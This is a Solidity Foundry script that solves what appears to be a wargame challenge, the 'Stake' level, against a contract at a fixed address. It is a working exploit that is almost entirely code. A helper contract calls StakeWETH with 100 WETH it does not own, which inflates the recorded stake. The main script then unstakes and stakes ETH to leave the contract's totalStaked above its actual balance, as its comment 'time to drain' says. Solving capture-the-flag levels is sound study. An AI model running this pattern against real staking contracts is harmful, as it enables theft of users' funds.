// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Stake } from "../src/Stake.sol";

import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";


contract Helper {

	Stake public instance = Stake(payable(0xD4D917560CE842165a6AF4CAc87C251336d8EB64));
	
	constructor () payable {
		
		address(instance).call{value: 0.0011 ether}(abi.encodeWithSelector(instance.StakeETH.selector));
	}

	function help() external {
		uint256 amountIDontHave = 100 ether;
		
		ERC20 wEth = ERC20(instance.WETH());

		wEth.approve(address(instance), amountIDontHave);
		instance.StakeWETH(amountIDontHave);

	}

}

contract StakeSolver is Script {
	
	Stake public instance = Stake(payable(0xD4D917560CE842165a6AF4CAc87C251336d8EB64));

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

		ERC20 wEth = ERC20(instance.WETH());

		console.log(address(wEth));
		console.logBytes32(bytes32(wEth.balanceOf(address(instance))));
		console.logBytes32(bytes32(address(instance).balance));

	
		uint256 amount = 0.0011 ether;
		address(instance).call{value: amount}(abi.encodeWithSelector(instance.StakeETH.selector));

		Helper myHomie = new Helper{value: 0.0011 ether}();

		myHomie.help();

		console.logBytes32(bytes32(address(instance).balance));	
		console.logBytes32(bytes32(instance.UserStake(me)));

		// now that we look like we stakes more than 100 ether its time to drain

		instance.Unstake(amount);

		console.log("conditions of solving the challenge : ");
		console.log(address(instance).balance > 0);
		console.log(instance.totalStaked() > address(instance).balance);
		console.log(instance.Stakers(me));
		console.log(instance.UserStake(me) == 0);

		vm.stopBroadcast();


	}

}
